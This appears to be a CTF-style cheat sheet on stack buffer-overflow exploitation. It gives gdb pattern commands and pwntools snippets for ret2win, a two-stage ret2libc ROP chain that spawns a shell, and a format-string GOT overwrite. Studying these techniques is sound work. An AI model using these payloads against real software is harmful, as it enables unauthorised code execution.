# Buffer Overflow

Find the offset to the saved return address with a cyclic pattern, then escalate depending on protections (`checksec`).

```bash
# in gdb/GEF:
pattern create 300
run              # crash with the pattern
pattern search $rsp    # or the crashing register — gives the exact offset
```

ret2win (no ASLR, or a fixed-address win function exists):
```python
from pwn import *
offset = 136
payload = b"A" * offset + p64(win_addr)   # jump straight to a function that pops a shell
```

ret2libc / GOT leak when ASLR is on and there's no win function:
```python
# stage 1: leak a libc address via an existing function (e.g. puts(GOT entry))
rop1 = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
payload = b"A" * offset + rop1
# ... receive the leak, compute: libc_base = leaked_addr - libc.symbols['puts']

# stage 2: pop rdi -> "/bin/sh" -> system(), using libc_base + known offsets
rop2 = p64(pop_rdi) + p64(libc_base + binsh_offset) + p64(libc_base + libc.symbols['system'])
payload = b"A" * offset + rop2
```

Format string write (when input reaches `printf(user_input)` directly) — overwrite a GOT entry with a win/shell function instead of a return address:
```python
payload = fmtstr_payload(offset_to_your_arg, {elf.got['exit']: elf.symbols['win']})
```

Always check `checksec <binary>` first (NX, PIE, canary, RELRO) — it decides which of the above applies.
